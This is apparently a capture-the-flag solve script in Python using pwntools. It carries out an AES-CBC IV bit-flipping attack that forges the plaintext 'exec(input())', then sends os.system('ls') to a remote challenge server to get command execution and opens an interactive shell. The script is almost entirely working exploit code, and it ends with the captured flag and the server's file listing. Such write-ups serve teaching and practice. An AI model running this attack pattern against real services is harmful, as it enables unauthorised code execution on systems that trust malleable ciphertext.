from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def transform(newmsg,iv):
    changeit = newmsg
    for i in range(16-len(newmsg)):
        changeit += b"\t"
    oldmsg = b"trapped_forever\t"
    oldxor = xor(oldmsg,changeit)
    newiv = xor(oldxor,iv[:16])
    return newiv

LOCAL = False

IP = '34.147.79.216'
PORT = 1337

if LOCAL:
    IP = "127.0.0.1"
    PORT = 9001
    io = remote(IP,PORT)
else:
    io = remote(IP,PORT)



plaintext = b"trapped_forever\x01"

for i in range(5):
    print(io.recvline())

encrypted = io.recvline().decode().replace("\n","")
enctext = bytes.fromhex(encrypted[32:])
IV = bytes.fromhex(encrypted[:32])

print(f"IV: {IV}")
print(f"ENC: {enctext}")

io.sendline(transform(b"exec(input())",IV).hex() +enctext.hex())
io.sendline(b"os.system('ls')")
io.interactive()

"""
>>flag.txt
nite{Th3__gr3at_esc4p3}
server.py
"""

